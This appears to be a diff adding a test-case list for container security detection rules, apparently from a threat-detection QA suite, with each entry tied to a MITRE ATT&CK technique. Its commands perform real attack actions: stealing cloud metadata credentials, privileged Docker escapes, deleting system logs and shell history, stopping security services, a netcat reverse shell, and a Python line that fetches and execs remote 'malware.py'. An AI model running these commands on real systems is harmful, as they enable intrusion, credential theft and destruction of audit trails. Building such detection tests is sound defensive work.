@@ -1,0 +1,135 @@
+#==========================Cloud_Credentials_accessed_by_network_utility_T1552_005==========================
+Rule_title=Cloud credentials_T1552_005
+1. command=
+   TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+   curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/
+
+#==========================Container_Management_Utility_In_Container_T1609==========================
+Rule_title=Container Management_T1609
+2. command=
+   docker run --rm -it --privileged -v /:/mnt alpine chroot /mnt
+   docker info
+
+#=======================Cryptominer_Execution_T1496==============================
+Rule_title=CryptoMiner Execution_T1496
+3. command=
+
+#=======================Credential_Access_Bash_History_T1552_003==============================
+Rule_title=Credential Access_T1552_003
+4. command=/usr/bin/cat  /.bash_history
+   cat /.bash_history
+   rm /.zsh_history
+
+#=======================Network_Scanning_Utility_T1046==============================
+Rule_title=Network scanning utility_T1046
+5. command=
+   pnscan -t512 -R "6f 73 3a 4c 69 6e 75 78" -W "2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a" 221.0.0.0/16 6379
+           
+#=======================Container_Escape_Via_Cgroup_T1611==============================
+Rule_title=escape_cgroup_T1611
+6. command=
+   unshare -UrmC sh -c 'mount -t cgroup -o memory cgroup /mnt && bash'
+
+#=======================Container_Escape_Using_Runtime_Socket_T1611==============================
+Rule_title=Container_escape_using_runtime_socket_T1611
+7. command=
+   curl -s --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["sh","-c","echo Hello from Alpine"],"AttachStdout":true,"AttachStderr":true}' http://localhost/containers/create?name=alpine-from-api
+
+#=======================Clear_System_Logs_T1070_002==============================
+Rule_title=Clear_System_Logs_T1070_002
+8. command=rm /var/log/syslog 
+   rm /var/log/messages 
+   rm /var/log/auth.log
+   rm /var/log/secure 
+   rm /var/log/boot.log 
+   rm /var/log/maillog 
+   rm /var/log/mail.log 
+   rm /var/log/kern.log 
+   rm /var/log/dmesg 
+   rm /var/log/faillog 
+   rm /var/log/cron 
+   rm /var/log/daemon.log 
+   rm /var/log/btmp 
+   rm /var/log/mysqld.log 
+   rm /var/log/mysql.log 
+   rm /var/log/xferlog  
+
+#=======================Process_Hidden_Using_Mount_Hidepid_T1564==============================
+Rule_title=Process_hidden_using_mount_hidepid_T1564
+9. command=
+   mount -o remount,hidepid=2 /proc
+   mount | grep "on /proc "
+
+#=======================Curl_Using_Socks_Proxy_T1572==============================
+Rule_title=Curl_Using_Socks_Proxy_T1572
+10. command=
+    curl -x socks5://ubuntu1:ubuntu1@13.218.226.168:1080 http://www.google.com/
+
+#=======================Schedule_Cron_Jobs_T1053_003==============================
+Rule_title=Schedule_Cron_Jobs_T1053_003
+11. command=
+    docker_image=qualysdockerhub/overlay-functional:threatqatest
+    args: ['crontab -e']
+
+#=======================Network_Utility_Executed_T1016==============================
+Rule_title=network_utility_T1552_005
+12. command=
+    timeout 5 tcpdump
+    docker_image=qualysdockerhub/overlay-functional:threatqatest
+
+#=======================Launch_Ingress_Remote_File_Copy_Tools_in_Container_T1105==============================
+Rule_title=Launch_Ingress_Remote_File_Copy_T1105
+13. command=
+    curl --location --request GET 'https://go.microsoft.com/fwlink/?linkid=2108834&Channel=Stable&language=en' --output foo.exe
+    docker_image=qualysdockerhub/overlay-functional:threatqatest
+
+#=======================Python_Executed_With_Suspicious_Arguments_T1059_006==============================
+Rule_title=Python_executed_suspicious_arg_T1059_006
+14. command=
+    python3 -c 
+    timeout 10 python3 -c 'import urllib.request; exec(urllib.request.urlopen("http://10.113.107.226:8000/malware.py").read())'
+    docker_image=qualysdockerhub/overlay-functional:threatqatest
+
+#=======================Kubernetes_Service_Account_Token_Created_In_Container_T1609==============================
+Rule_title=Kubernetes_service_account_T1609
+15. command=
+    kubectl create serviceaccount privileged-sa
+    kubectl create clusterrolebinding privileged-sa-binding --clusterrole=cluster-admin --serviceaccount=default:privileged-sa
+    kubectl create serviceaccount my-serviceaccount
+    docker_image=qualysdockerhub/overlay-functional:threatqatest
+
+#=======================Container_Escape_Using_Docker_Socket_T1611==============================
+Rule_title=Container docker socket_T1611
+16. command=
+    ls -l /var/run/docker.sock
+    docker run --rm -i --privileged -v /:/mnt alpine chroot /mnt
+   
+#=======================Compiler_Executed_In_Container_T1027_004==============================
+Rule_title=Compiler_executed_in_container_T1027_004
+17. command=
+    echo "gcc -o memfd-exec memfd-exec.c"
+    gcc -o memfd-exec memfd-exec.c
+    ls -l memfd-exec
+    docker_image=qualysdockerhub/overlay-functional:threatqatest
+
+#=======================Stop_Antimalware_Process_T1562_001==============================
+Rule_title=Stop_antimalware_process_T1562_001
+18. command=
+    service aliyun.service stop
+    service apparmor stop
+    service bcm-agent stop
+    service aegis stop
+
+#=======================Netcat_Reverse_Shell_Execution_T1059_004==============================
+Rule_title=Netcat_Execution_T1059_004
+19. command=
+    docker_image=qualysdockerhub/overlay-functional:threatqatest
+    args: ['nc -e /bin/bash 10.113.107.226 4444; sleep infinity']
+
+#=======================Process_Execution_From_Memory_T1106==============================
+Rule_title=pexec_memory_T1106
+20. command=
+    ./memfd-exec
+    ./memfd-exec
+    docker_image=qualysdockerhub/overlay-functional:threatqatest
+
